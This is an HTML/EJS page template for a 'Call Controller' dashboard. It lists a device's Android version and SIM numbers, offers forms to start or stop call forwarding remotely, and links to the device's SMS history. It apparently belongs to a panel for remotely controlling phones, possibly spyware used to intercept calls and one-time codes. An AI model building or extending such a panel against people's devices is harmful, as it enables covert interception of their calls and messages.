<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Device Details</title>
  <link rel="stylesheet" href="/css/final.css">
</head>
<body>
  <!-- Header Navigation -->
  <header class="header-nav">
    <h1>Call Controller</h1>
  </header>

  <!-- Main Content Container -->
  <div class="container">
    <div class="device-details">
      <div class="align">
        <h2>Device Information</h2>
        <p><strong>Mobile:</strong> <%= device.brand %></p>
        <p><strong>Android Version:</strong> <%= device.androidVersion %></p>
        <p><strong>SIM 1:</strong> <%= sim1Number %></p>
        <p><strong>SIM 2:</strong> <%= sim2Number %></p>
      </div>
      
      <!-- Toggle Button -->
      <a class="toggle-btn" href="#">Select SIM</a>

      <!-- Start Call Forwarding Form -->
      <form id="startForm" method="POST" action="/api/device/admin/set/<%= device._id %>">
        <input type="hidden" id="selectedSim" name="sim">
        <input type="text" name="phoneNumber" placeholder="Enter 10-digit Phone Number" required>
        <button type="submit">Start Call Forwarding</button>
      </form>

      <!-- Stop Call Forwarding Form -->
      <form id="stopForm" method="POST" action="/api/device/admin/stop/<%= device._id %>">
        <input type="hidden" id="stopSelectedSim" name="sim">
        <button type="submit">Stop Call Forwarding</button>
      </form>

      <div class="back-link">
        <a class="View" href="/api/data/detail/<%= device._id %>">View Full Device Details</a>
        <a class="History" href="/api/notification/custom/sms/<%= device._id %>">View SMS History</a>
      </div>
    </div>
  </div>

  <!-- Toggle Page for SIM Selection -->
  <div class="toggle-page">
    <div class="toggle-content">
      <div class="sim-option active">SIM 1</div>
      <div class="sim-option">SIM 2</div>
    </div>
  </div>

  <script src="/js/cript.js"></script>
</body>
</html>
